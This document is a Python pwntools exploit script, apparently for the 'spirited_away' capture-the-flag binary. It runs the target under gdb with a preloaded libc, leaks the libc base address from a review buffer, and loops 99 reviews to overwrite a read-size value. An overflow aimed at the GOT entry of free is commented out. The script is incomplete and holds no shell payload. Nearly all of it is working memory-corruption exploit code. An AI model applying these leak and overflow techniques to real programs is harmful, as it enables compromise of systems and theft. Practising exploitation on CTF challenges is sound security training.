from pwn import *

context.log_level = 'debug'

spirited_away = ELF('spirited_away')
libc = ELF('libc_32.so.6')


class Prompts:
    NAME = '\nPlease enter your name: '
    AGE = 'Please enter your age: '
    REASON = 'Why did you came to see this movie? '
    COMMENT = 'Please enter your comment: '
    ANOTHER_COMMENT = 'Would you like to leave another comment? <y/n>: '


p = gdb.debug(
    spirited_away.path,
    '''
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def write_review(name='AAAA', reason='BBBB', comment='CCCC'):
    p.sendafter(Prompts.NAME, name)
    p.sendlineafter(Prompts.AGE, '19')
    p.sendafter(Prompts.REASON, reason)
    p.sendafter(Prompts.COMMENT, comment)
    return p.sendafter(Prompts.ANOTHER_COMMENT, 'y')


def overwrite_read_size():
    print('[*] overwriting the read size of the name buffer and comment.')
    remaining_reviews = 99
    for _ in range(remaining_reviews):
        write_review()


def overflow_name():
    write_review(comment=b'A' * 0x50 + p32(spirited_away.got['free']))


def leak_libc():
    review = write_review(reason='A' * 0x14)
    libc.address = u32(review[0x2f:0x2f+0x4]) - 0x5f29b
    print(f'[*] libc base address: {hex(libc.address)}')


def exploit():
    leak_libc()
    overwrite_read_size()
    # overflow_name()


if __name__ == "__main__":
    exploit()
